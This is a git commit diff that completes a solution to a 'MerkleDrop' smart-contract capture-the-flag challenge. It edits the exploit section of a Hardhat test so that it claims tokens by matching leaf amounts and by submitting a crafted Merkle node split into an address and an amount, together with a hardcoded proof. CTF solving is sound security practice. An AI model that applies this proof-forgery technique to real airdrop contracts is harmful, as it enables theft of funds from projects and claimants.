85670fe5ec6e73340515ad264c8c8a184e7df53f
0xSilas <silaszhr@gmail.com>
2022-09-19 11:51:00 +0800

    chore: complete writeup for merkleDrop challenge

--- test/merkledrop/merkledrop.ts
+++ test/merkledrop/merkledrop.ts
@@ -25,7 +25,8 @@ describe('[Challenge] MerkleDrop', function () {
          /** CODE YOUR EXPLOIT HERE */
         let node = await findNode();
         let results = getResult();
-        results = results.map(x => x.toString())
+        results = results.map(x => x.toHexString())
+
         
         const merkleDisbutorAddress = await this.challenge.merkleDistributor();
         const MerkleDistributorFactory = await ethers.getContractFactory('MerkleDistributor', attacker);
@@ -34,14 +35,13 @@ describe('[Challenge] MerkleDrop', function () {
         for (let p in results){
             for (let leaf in claims) {
                 let leafData = claims[leaf];
-                if (node['amounts'] === results[p]){
+                if (leafData['amount'] === results[p]){
                     await MerkleDistributor.claim(leafData['index'], leaf, leafData['amount'], leafData['proof']);
                 }
             }
         }
         
-        console.log(node[0]);
-        console.log(node[0].substr(0,42), node[0].substr(42));
+        //console.log(node[0].substr(0,42), node[0].substr(42));
         await MerkleDistributor.claim("0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442", node[0].substr(0,42), '0x'+ node[0].substr(42),  [
             "0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d",
             "0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde",
@@ -53,6 +53,7 @@ describe('[Challenge] MerkleDrop', function () {
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+
         expect(
             await this.challenge.isSolved()
         ).to.equal(true);
